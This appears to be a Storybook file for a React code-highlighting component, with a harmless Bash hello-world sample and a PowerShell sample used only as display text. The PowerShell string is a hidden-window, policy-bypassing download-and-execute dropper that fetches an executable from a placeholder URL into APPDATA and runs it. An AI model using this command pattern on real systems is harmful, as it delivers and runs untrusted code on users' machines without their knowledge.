import React from "react";
import { storiesOf } from "@storybook/react";
import { action } from "@storybook/addon-actions";

import { Components } from "../client/modules/components.js";

const powershell = `
powershell.exe -command PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('URL HERE',"$env:APPDATA\\ps.exe");Start-Process ("$env:APPDATA\\ps.exe")
`;

const bash = `
#!/bin/bash
echo "Hello, world!"
read -p "What is your name? " name
echo "Hello, \${name}!"
`;

const code_highlight = storiesOf("UI/Code Highlighting", module);

code_highlight.add("PowerShell", () => (
  <div>
    <Components.CodeHighlight code={powershell} language="PowerShell" />
  </div>
));

code_highlight.add("Bash", () => (
  <div>
    <Components.CodeHighlight code={bash} language="Bash" />
  </div>
));
